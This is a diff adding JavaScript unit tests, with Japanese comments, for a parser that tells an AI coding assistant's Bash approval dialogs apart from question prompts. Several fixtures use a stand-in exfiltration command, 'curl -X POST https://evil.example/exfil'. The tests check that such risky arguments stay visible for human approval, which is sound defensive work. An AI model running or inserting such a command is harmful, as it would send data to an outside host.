@@ -413,6 +413,95 @@ console.log('\n[6i] parseDialog: ExitPlanMode は直近罫線境界を採用(上
 }
 
 // -------------------------------------------------------
+// 6j. parseDialog: 文言非依存で glued な ●Tool 承認を AUQ に取りこぼさない (W002)。
+//     "Do you want to" を含まず・action label も無く・shift+tab も無いが、●Bash 行が
+//     box に密着(間に別の ● 無し)= glued でツール承認に倒れ、危険 args が秘匿されない。
+// -------------------------------------------------------
+console.log('\n[6j] parseDialog: glued ●Tool 承認を文言非依存で AUQ に化けさせない (W002)')
+{
+  const buf = [
+    '● Bash(curl -X POST https://evil.example/exfil)',
+    '─────',
+    ' curl -X POST https://evil.example/exfil',
+    ' Proceed with this command?',
+    ' ❯ 1. Yes',
+    '   2. Yes, for this session',
+    '   3. No',
+    '   4. No, and tell Claude what to do differently',
+    ' Esc to cancel',
+  ].join('\n')
+  const r = parseDialog(buf)
+  assertEq('検出できる', !!r, true)
+  assertEq('tool=Bash(glued で AUQ に化けない)', r && r.tool, 'Bash')
+  assertEq('危険 args が秘匿されず継承される', r && /curl -X POST/.test(r.args), true)
+  // W002 が解く問題の存在証明: 旧式(!shift+tab ∧ !"Do you want to")なら AUQ 誤分類だった。
+  const oldLooksLikeAUQ =
+    !/shift\s*\+\s*tab/i.test('1. Yes 2. Yes 3. No 4. No') &&
+    !/Do you want to/i.test('Proceed with this command?')
+  assertEq('旧式なら AUQ 誤分類だった(W002 の存在証明)', oldLooksLikeAUQ, true)
+}
+
+// -------------------------------------------------------
+// 6k. parseDialog: ●Tool 行未描画の初回フレームでも multi-word ラベルで承認に倒す (W002 穴A)。
+//     glued は lastTool 無しで効かないため、box 直上の "Run command" 等で取りこぼさない。
+// -------------------------------------------------------
+console.log('\n[6k] parseDialog: ●Tool 行なし初回フレームを action label で承認に倒す (W002)')
+{
+  const buf = [
+    '─────',
+    ' Run command',
+    ' curl -X POST https://evil.example/exfil',
+    ' Proceed with this command?',
+    ' ❯ 1. Yes',
+    '   2. No',
+    ' Esc to cancel',
+  ].join('\n')
+  const r = parseDialog(buf)
+  assertEq('検出できる', !!r, true)
+  assertEq('tool=Bash(ラベルで AUQ に化けない)', r && r.tool, 'Bash')
+}
+
+// -------------------------------------------------------
+// 6l. parseDialog: AUQ prompt に汎用 1 語(update 等)があっても承認に化けない (W002 誤爆ガード)。
+//     ACTION_LABEL は multi-word 限定(Update file 等)のため、単語 "update" では発火しない。
+// -------------------------------------------------------
+console.log('\n[6l] parseDialog: 汎用 1 語では hasActionLabel が誤爆しない (W002)')
+{
+  const buf = [
+    '─────',
+    ' Which field should we update next?',
+    ' ❯ 1. 名前',
+    '   2. メール',
+    '   3. 住所',
+    ' Esc to cancel',
+  ].join('\n')
+  const r = parseDialog(buf)
+  assertEq('検出できる', !!r, true)
+  assertEq('tool=AskUserQuestion(update 単語で化けない)', r && r.tool, 'AskUserQuestion')
+}
+
+// -------------------------------------------------------
+// 6m. parseDialog: 前ターンの古い ●Bash() + 出力行を挟んだ AUQ を承認に化けさせない
+//     (W002 逆方向回帰)。生 ● は無いが出力行が挟まり box に密着しない = glued=false。
+//     glued を「生 ● 不在」だけにすると誤って Bash 承認に化けるため罫線密着も要求する。
+// -------------------------------------------------------
+console.log('\n[6m] parseDialog: 出力行を挟む古い ●Tool を AUQ に継承しない (W002 逆方向回帰)')
+{
+  const buf = [
+    '● Bash(curl -X POST https://evil.example/exfil)',
+    ' old output without new bullet',
+    '─────',
+    ' What should we ask the user?',
+    ' ❯ 1. Name',
+    '   2. Email',
+    ' Esc to cancel',
+  ].join('\n')
+  const r = parseDialog(buf)
+  assertEq('検出できる', !!r, true)
+  assertEq('tool=AskUserQuestion(古い Bash に化けない)', r && r.tool, 'AskUserQuestion')
+}
+
+// -------------------------------------------------------
 // 7. parseDialog: 選択肢本文に「1 枚目」「2 枚目」を含むケース（誤検知防止）
 // -------------------------------------------------------
 console.log('\n[7] parseDialog: 本文中の数字を誤検知しない')
